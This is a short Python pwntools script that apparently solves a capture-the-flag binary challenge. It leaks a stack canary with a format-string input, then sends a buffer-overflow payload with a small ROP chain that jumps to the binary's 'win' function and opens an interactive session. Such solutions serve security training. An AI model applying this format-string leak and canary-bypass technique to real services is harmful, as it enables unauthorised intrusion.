#!/usr/bin/env python3
from pwn import *
import re

HOST = "chal.bearcatctf.io"
PORT = 28799
BIN_PATH = "./vuln"

context.update(arch="amd64", os="linux")


def leak_canary(io) -> int:
    io.recvuntil(b"what is your name pirate?")
    io.sendline(b"%13$p")
    data = io.recvuntil(b"Where do you think", drop=False)

    m = re.search(rb"0x[0-9a-fA-F]+", data)
    if not m:
        raise RuntimeError(f"failed to parse leak from: {data!r}")
    return int(m.group(0), 16)


def build_payload(canary: int, win_addr: int) -> bytes:
    ret = 0x40132C
    pop_rdi = 0x40132D
    return b"A" * 0x28 + p64(canary) + b"B" * 8 + flat(ret, pop_rdi, 6, win_addr)


def main():
    elf = ELF(BIN_PATH, checksec=False)
    io = remote(HOST, PORT)

    canary = leak_canary(io)
    log.success(f"canary = {hex(canary)}")

    payload = build_payload(canary, elf.symbols["win"])
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
